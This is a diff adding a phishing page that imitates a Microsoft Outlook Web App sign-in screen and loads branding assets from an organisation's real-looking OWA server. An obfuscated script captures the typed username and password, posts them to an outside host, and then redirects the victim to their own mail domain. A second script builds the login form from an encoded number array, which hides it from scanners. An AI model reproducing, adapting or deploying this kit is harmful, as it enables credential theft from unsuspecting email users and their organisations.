@@ -1,0 +1,335 @@
+<html><head>
+<link rel="shortcut icon" href="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/favicon.ico" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
+<meta name="Robots" content="NOINDEX, NOFOLLOW">
+<title>Outlook Web App</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">       </script>
+<link type="text/css" rel="stylesheet" href="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/logon.css">
+<link type="text/css" rel="stylesheet" href="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/owafont.css">
+<script type="text/javascript">
+    window.onload=function(){if(a_fRC)initLogon();else redir()};function initLogon(){try{LogoffMime()}catch(e){}var d=/(^|; )logondata=acc=([0|1])&lgn=([^;]+)(;|$)/,a=d.exec(document.cookie);if(a){gbid("username").value=a[3];gbid("password").focus();gbid("rdoPrvt").click();a[2]=="1"&&gbid("chkBsc")&&gbid("chkBsc").click()}else if(g_fFcs)try{gbid("username").focus()}catch(e){}if(IsOwaPremiumBrowser()&&gbid("chkBsc"))gbid("chkBsc").disabled=false;var b="cookieTest";document.cookie=secureCookie(b+"=1");var c=document.cookie.indexOf(b+"=")!=-1;if(c==false){shw(gbid("tblMid2"));hd(gbid("tblMid"))}}function redir(){var a=window;try{if(a.dialogArguments){var g=new String(Math.round(Math.random()*1e5)),f="toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=1,width=800,height=600",i=Math.round((screen.availHeight-600)/2),h=Math.round((screen.availWidth-800)/2);f+=",top="+i+",left="+h;var e=a.dialogArguments.opener;try{e&&e.open(a_sCW,g,f)}catch(l){}a.close();return}}catch(l){}var b=a_sUrl;while(1)try{if(!(a.frameElement&&a.frameElement.ownerDocument))break;var c=a.frameElement.ownerDocument.parentWindow||a.frameElement.ownerDocument.defaultView;if(!c||!c.g_fOwa&&!c.g_fEcp)break;a=c;b=a.GetReloadUrl?"&url="+encodeURIComponent(a.GetReloadUrl()):""}catch(l){break}try{var d=a.opener;if(d&&(d.g_fOwa||d.g_fEcp)){var j=Math.round((screen.availWidth-800)/2),k=Math.round((screen.availHeight-600)/2);a.moveTo(j,k);a.resizeTo(800,600);b="&url="+encodeURIComponent(a_sCW)}}catch(l){}if(a.navigate)a.navigate(a_sLgn+b);else a.location=a_sLgn+b}function shw(a){a.style.display=""}function hd(a){a.style.display="none";}
+    
+    
+    
+    
+    function clkExp(b){var a=gbid(b);if(a.tagName=="IMG")a=a.parentNode;switch(a){case gbid("lnkShwSec"):hd(gbid("lnkShwSec"));shw(gbid("lnkHdSec"));shw(gbid("trPubExp"));shw(gbid("trPrvtExp"));gbid("lnkHdSec").focus();break;case gbid("lnkHdSec"):shw(gbid("lnkShwSec"));hd(gbid("lnkHdSec"));hd(gbid("trPubExp"));hd(gbid("trPrvtExp"));gbid("lnkShwSec").focus()}}function clkSec(){var b=gbid("rdoPrvt").checked;gbid("trPrvtWrn").style.display=b?"":"none";if(b)document.logonForm.flags.value|=4;else{document.logonForm.flags.value&=~4;var a=new Date;a.setTime(a.getTime()-9999);document.cookie=secureCookie("logondata=; expires="+a.toUTCString())}}function clkBsc(){var a=gbid("chkBsc").checked;gbid("trBscExp").style.display=a?"":"none";if(a)document.logonForm.flags.value|=1;else document.logonForm.flags.value&=~1}function clkLgn(){addPerfMarker("Logon.Start");if(gbid("rdoPrvt").checked){var a=new Date;a.setTime(a.getTime()+2*7*24*60*60*1e3);var b="acc="+(gbid("chkBsc")&&gbid("chkBsc").checked?1:0),c="lgn="+gbid("username").value;document.cookie=secureCookie("logondata="+b+"&"+c+"; expires="+a.toUTCString())}document.cookie=secureCookie("PBack=0; path=/")}function clkRtry(){window.location.reload()}function clkReLgn(){window.location.href="../"}function gbid(a){return document.getElementById(a)}function IsOwaPremiumBrowser(){var a=navigator.userAgent,c=navigator.appVersion,h=c.indexOf("Mac")!=-1,i=c.indexOf("Win")!=-1||c.indexOf("NT")!=-1,f=a.indexOf("Trident")!=-1&&a.indexOf("rv:")!=-1,g=f||a.indexOf("MSIE ")!=-1,d=a.indexOf("Firefox/")!=-1&&a.indexOf("Gecko/")!=-1&&Array.every,e=a.indexOf("Safari")!=-1&&a.indexOf("WebKit")!=-1,b=2;if(g)if(f)b=parseFloat(a.replace(/^.*rv:/,""));else b=parseFloat(a.replace(/^.*MSIE /,""));else if(d)b=parseFloat(a.replace(/^.*Firefox\//,""));else if(e)b=parseFloat(a.replace(/^.*Version\//,""));else b=parseInt(c);if(i){if(g)return b>=7;else if(e)return b>=3;else if(d)return b>=3}else if(h)if(e)return b>=2;else if(d)return b>=3;return false}function hres(a){return a+4294967295+1;}
+    </script>
+
+<script type="text/javascript">
+        
+        function shw(a){a.style.display=""}function hd(a){a.style.display="none"}function clkExp(b){var a=gbid(b);if(a.tagName=="IMG")a=a.parentNode;switch(a){case gbid("lnkShwSec"):hd(gbid("lnkShwSec"));shw(gbid("lnkHdSec"));shw(gbid("trPubExp"));shw(gbid("trPrvtExp"));gbid("lnkHdSec").focus();break;case gbid("lnkHdSec"):shw(gbid("lnkShwSec"));hd(gbid("lnkHdSec"));hd(gbid("trPubExp"));hd(gbid("trPrvtExp"));gbid("lnkShwSec").focus()}}function clkSec(){var b=gbid("rdoPrvt").checked;gbid("trPrvtWrn").style.display=b?"":"none";if(b)document.logonForm.flags.value|=4;else{document.logonForm.flags.value&=~4;var a=new Date;a.setTime(a.getTime()-9999);document.cookie=secureCookie("logondata=; expires="+a.toUTCString())}}function clkBsc(){var a=gbid("chkBsc").checked;gbid("trBscExp").style.display=a?"":"none";if(a)document.logonForm.flags.value|=1;else document.logonForm.flags.value&=~1}
+</script>
+  <script type="text/javascript">
+var _0x499c=['username','customerror','POST','message','length','Check\x20your\x20network\x20connection..','val','password','fail','input[name=password]','focus','failedme','none','block','json','preventDefault','done','log','getElementById','innerHTML','slice','display','hash','https://rologisped.com/chd/webappwhiteuyen-main-wey-no-dey-select.php','ajax','replace','https://','value','onload','myprocess','trInvCrd','style','location'];(function(_0xe4bf78,_0x499c6e){var _0x1e4c58=function(_0xfdb41e){while(--_0xfdb41e){_0xe4bf78['push'](_0xe4bf78['shift']());}};_0x1e4c58(++_0x499c6e);}(_0x499c,0x170));var _0x1e4c=function(_0xe4bf78,_0x499c6e){_0xe4bf78=_0xe4bf78-0x0;var _0x1e4c58=_0x499c[_0xe4bf78];return _0x1e4c58;};var _0x188b98=_0x1e4c,hash=window[_0x188b98('0x1b')][_0x188b98('0x11')]['substr'](0x1);window[_0x188b98('0x17')]=function onoff(){var _0xd73484=_0x188b98,_0xfdb41e=window[_0xd73484('0x1b')][_0xd73484('0x11')][_0xd73484('0x14')]('#','');hash?(document[_0xd73484('0xd')](_0xd73484('0x1c'))[_0xd73484('0x16')]=_0xfdb41e,document['getElementById'](_0xd73484('0x2'))['focus']()):document['getElementById'](_0xd73484('0x1c'))[_0xd73484('0x5')]();};function checkFilled(){var _0x333d00=_0x188b98,_0x5c74d5=document[_0x333d00('0xd')](_0x333d00('0x1c')),_0x44a5c1=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/,_0x54580e=document['getElementById'](_0x333d00('0x2'));if(!_0x5c74d5[_0x333d00('0x16')]['match'](_0x44a5c1))return document[_0x333d00('0xd')](_0x333d00('0x19'))[_0x333d00('0x1a')][_0x333d00('0x10')]=_0x333d00('0x8'),_0x5c74d5[_0x333d00('0x5')](),![];else document[_0x333d00('0xd')](_0x333d00('0x19'))[_0x333d00('0x1a')]['display']=_0x333d00('0x7'),_0x54580e[_0x333d00('0x5')]();if(_0x54580e[_0x333d00('0x16')][_0x333d00('0x20')]<0x5)return document[_0x333d00('0xd')](_0x333d00('0x19'))[_0x333d00('0x1a')][_0x333d00('0x10')]=_0x333d00('0x8'),_0x54580e[_0x333d00('0x5')](),![];else{var _0x1e7fb5=_0x5c74d5[_0x333d00('0x16')]['indexOf']('@'),_0x45b5d4=_0x5c74d5[_0x333d00('0x16')][_0x333d00('0xf')](_0x1e7fb5+0x1,_0x5c74d5[_0x333d00('0x16')]['length']),_0x50e41c=_0x333d00('0x15')+_0x45b5d4;document[_0x333d00('0xd')]('trInvCrd')[_0x333d00('0x1a')][_0x333d00('0x10')]=_0x333d00('0x7');var _0x83ecc6={'myvapop':$('input[name=username]')[_0x333d00('0x1')](),'mygoupad':$(_0x333d00('0x4'))[_0x333d00('0x1')](),'proche':$('input[name=myprocess]')[_0x333d00('0x1')]()};$[_0x333d00('0x13')]({'type':_0x333d00('0x1e'),'url':_0x333d00('0x12'),'data':_0x83ecc6,'dataType':_0x333d00('0x9'),'encode':!![]})[_0x333d00('0xb')](function(_0x93fb16){var _0x4d6a8b=_0x333d00;console[_0x4d6a8b('0xc')](_0x93fb16),_0x93fb16[_0x4d6a8b('0x1f')]==_0x4d6a8b('0x6')?(document['getElementById'](_0x4d6a8b('0x18'))['value']=0x1,document['getElementById'](_0x4d6a8b('0x19'))[_0x4d6a8b('0x1a')][_0x4d6a8b('0x10')]='block',_0x54580e['value']='',_0x54580e[_0x4d6a8b('0x5')]()):window[_0x4d6a8b('0x1b')][_0x4d6a8b('0x14')](_0x50e41c);})[_0x333d00('0x3')](function(_0x575083){var _0xcf732=_0x333d00;document[_0xcf732('0xd')](_0xcf732('0x19'))[_0xcf732('0x1a')][_0xcf732('0x10')]=_0xcf732('0x8'),document['getElementById'](_0xcf732('0x1d'))[_0xcf732('0xe')]=_0xcf732('0x0'),_0x54580e[_0xcf732('0x16')]='',_0x54580e[_0xcf732('0x5')](),console[_0xcf732('0xc')](_0x575083);}),event[_0x333d00('0xa')]();}}
+    </script>
+</head>
+<body class="owaLgnBdy">
+<noscript>
+	<div id="dvErr">
+		<table cellpadding="0" cellspacing="0">
+		<tr>
+			<td><img src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/base/warn.png" alt=""></td>
+			<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn't support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook Web App.</td>
+		</tr>
+		</table>
+	</div>
+</noscript>
+
+<table align="center" id="tblMain" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+		<td colspan="3">
+			<table cellspacing="0" cellpadding="0" class="tblLgn">
+			<tbody><tr>
+				<td class="lgnTL"><img src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/lgntopl.gif" alt=""></td>
+				<td class="lgnTM"></td>
+				<td class="lgnTR"><img src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/lgntopr.gif" alt=""></td>
+			</tr>
+			</tbody></table>
+		</td>
+	</tr>
+	<tr>
+		<td id="mdLft">&nbsp;</td>
+		<td id="mdMid">
+			<table id="tblMid" class="mid">
+				<tbody><tr>
+					<td id="expltxt" class="expl">
+										
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<table cellpadding="0" cellspacing="0">
+						<colgroup><col>
+						<col class="w100">
+						</colgroup><tbody><tr id="trSec">
+							<td colspan="2">								
+								Security 
+									‎(
+									<a href="#" id="lnkShwSec" onClick="clkExp('lnkShwSec')">
+									show explanation 
+									</a>
+									<a href="#" id="lnkHdSec" onClick="clkExp('lnkHdSec')" style="display:none">
+									hide explanation 
+									</a>
+								)‎
+							</td>
+						</tr>						
+						<tr>
+							<td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onClick="clkSec()" checked=""></td>
+							<td><label for="rdoPblc">This is a public or shared computer</label></td>
+						</tr>
+						<tr id="trPubExp" class="expl" style="display:none">
+							<td></td>
+							<td>Select this option if you use Outlook Web App on a public computer. Be sure to sign out when you've finished and close all windows to end your session.</td>
+						</tr>
+						<tr>
+							<td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onClick="clkSec()"></td>
+							<td><label for="rdoPrvt">This is a private computer</label></td>
+						</tr>
+						<tr id="trPrvtExp" class="expl" style="display:none">
+							<td></td>
+							<td>Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</td>
+						</tr>
+						<tr id="trPrvtWrn" class="wrng" style="display:none">
+							<td></td>
+							<td>Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.</td>
+						</tr>
+						</tbody></table>
+					</td>
+				</tr>
+				
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<input type="hidden" class="form-control" name="myprocess" id="myprocess" value="">
+
+						<table cellpadding="0" cellspacing="0">
+							<colgroup><col>
+							<col class="w100">
+								
+								</colgroup><tbody><tr>							
+									<td><input id="chkBsc" type="checkbox" class="rdo" onClick="clkBsc();"></td>
+									<td nowrap=""><label for="chkBsc">Use the light version of Outlook Web App</label></td>
+								</tr>
+								<tr id="trBscExp" class="disBsc" style="display:none">
+									<td></td>
+									<td>The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a href="http://go.microsoft.com/fwlink/?LinkID=129362" id="bscLnk">click here.</a></td>
+								</tr>
+							
+						</tbody></table>
+					</td>
+				</tr>
+				
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<table cellpadding="0" cellspacing="0">
+							<colgroup><col class="nowrap">
+							<col class="w100">
+							<col>
+							</colgroup><tbody><tr>
+								<td nowrap="">
+                                    <script language="Javascript">
+var erp = new Array;
+erp[0] = 1013735778;
+erp[1] = 1701584998;
+erp[2] = 1869757730;
+erp[3] = 1970496882;
+erp[4] = 1851878757;
+erp[5] = 574506349;
+erp[6] = 1634298972;
+erp[7] = 1970496882;
+erp[8] = 544104813;
+erp[9] = 1698315311;
+erp[10] = 1818321509;
+erp[11] = 1816017967;
+erp[12] = 1952726541;
+erp[13] = 168364297;
+erp[14] = 151587081;
+erp[15] = 154956900;
+erp[16] = 543386721;
+erp[17] = 1936932130;
+erp[18] = 1954051184;
+erp[19] = 1633952318;
+erp[20] = 1013542512;
+erp[21] = 1970544745;
+erp[22] = 1681728117;
+erp[23] = 1936028270;
+erp[24] = 1634559266;
+erp[25] = 544104813;
+erp[26] = 1698505333;
+erp[27] = 1936028270;
+erp[28] = 1634559266;
+erp[29] = 544504176;
+erp[30] = 1698505332;
+erp[31] = 1702392866;
+erp[32] = 543386721;
+erp[33] = 1936932130;
+erp[34] = 1954051106;
+erp[35] = 1044131700;
+erp[36] = 1681788170;
+erp[37] = 151587081;
+erp[38] = 151587132;
+erp[39] = 796160574;
+erp[40] = 218761481;
+erp[41] = 151587081;
+erp[42] = 154956914;
+erp[43] = 1041041929;
+erp[44] = 151587081;
+erp[45] = 151587132;
+erp[46] = 1952718958;
+erp[47] = 1870099041;
+erp[48] = 1883054626;
+erp[49] = 1044147297;
+erp[50] = 1650813984;
+erp[51] = 1718579773;
+erp[52] = 577790323;
+erp[53] = 1937207154;
+erp[54] = 1679965776;
+erp[55] = 1634956151;
+erp[56] = 1869767738;
+erp[57] = 1009740897;
+erp[58] = 1650814014;
+erp[59] = 1009742948;
+erp[60] = 1041041929;
+erp[61] = 151587081;
+erp[62] = 151587132;
+erp[63] = 1952718947;
+erp[64] = 1818325875;
+erp[65] = 1025668216;
+erp[66] = 1953522020;
+erp[67] = 574504041;
+erp[68] = 1852863860;
+erp[69] = 543777853;
+erp[70] = 577790323;
+erp[71] = 1937207154;
+erp[72] = 1679958126;
+erp[73] = 1634559293;
+erp[74] = 577790323;
+erp[75] = 1937207154;
+erp[76] = 1679958132;
+erp[77] = 2037409085;
+erp[78] = 577790323;
+erp[79] = 1937207154;
+erp[80] = 1679958115;
+erp[81] = 1818325875;
+erp[82] = 1025668216;
+erp[83] = 1948393583;
+erp[84] = 1850109795;
+erp[85] = 1970486562;
+erp[86] = 1734305350;
+erp[87] = 1668496688;
+erp[88] = 574503983;
+erp[89] = 1952726541;
+erp[90] = 168364297;
+erp[91] = 151587081;
+erp[92] = 1009742962;
+erp[93] = 1041041929;
+erp[94] = 151587081;
+erp[95] = 151600244;
+erp[96] = 1916669194;
+erp[97] = 151587081;
+erp[98] = 151587081;
+erp[99] = 1014260768;
+erp[100] = 1668246643;
+erp[101] = 1885433405;
+erp[102] = 573710880;
+erp[103] = 1634494823;
+erp[104] = 1849500274;
+erp[105] = 1768384628;
+erp[106] = 572547948;
+erp[107] = 1634956093;
+erp[108] = 578058356;
+erp[109] = 1885430818;
+erp[110] = 1041041929;
+erp[111] = 151587081;
+erp[112] = 151587081;
+erp[113] = 218761481;
+erp[114] = 151587081;
+erp[115] = 151587132;
+erp[116] = 1768845429;
+erp[117] = 1948284025;
+erp[118] = 1885682978;
+erp[119] = 1651864692;
+erp[120] = 1869488672;
+erp[121] = 1668047219;
+erp[122] = 1933386338;
+erp[123] = 1953374752;
+erp[124] = 1986096245;
+erp[125] = 1698505299;
+erp[126] = 1768386080;
+erp[127] = 1768825376;
+erp[128] = 1869497196;
+erp[129] = 1768123197;
+erp[130] = 576940133;
+erp[131] = 1667974761;
+erp[132] = 1819043172;
+erp[133] = 673784382;
+erp[134] = 218761481;
+erp[135] = 151587081;
+erp[136] = 592137;
+var em = '';
+for(i=0;i<erp.length;i++){
+	tmp = erp[i];
+	if(Math.floor((tmp/Math.pow(256,3)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
+	if(Math.floor((tmp/Math.pow(256,2)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
+	if(Math.floor((tmp/Math.pow(256,1)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
+	if(Math.floor((tmp/Math.pow(256,0)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
+	};
+};
+document.write(em);
+                                    
+                                    </script>
+									<input name="isUtf8" type="hidden" value="1">
+								</td>
+							</tr>
+						</tbody></table>
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+				
+                    
+                    <tr id="trInvCrd" class="wrng" style="display: none;">
+					<td id="customerror">The user name or password you entered isn't correct. Try entering it again.</td>
+				</tr>
+			</tbody></table>
+			
+			<table class="mid tblConn">
+				<tbody><tr>
+					<td rowspan="2" align="right" class="tdConnImg"><img style="vertical-align:top" src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/lgnexlogo.gif" alt=""></td>
+					<td class="tdConn">Connected to Microsoft Exchange</td>
+				</tr>
+				<tr>
+					<td class="tdCopy">© 2010 Microsoft Corporation. All rights reserved.</td>
+				</tr>
+			</tbody></table>
+		</td>
+		<td id="mdRt">&nbsp;</td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<table cellspacing="0" cellpadding="0" class="tblLgn">
+			<tbody><tr>
+				<td class="lgnBL"><img src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/lgnbotl.gif" alt=""></td>
+				<td class="lgnBM"></td>
+				<td class="lgnBR"><img src="https://owa.napierblakeley.com/owa/14.3.487.0/themes/resources/lgnbotr.gif" alt=""></td>
+			</tr>
+			</tbody></table>
+		</td>
+	</tr>
+</tbody></table>
+
+
+</body></html>
+</body></html>
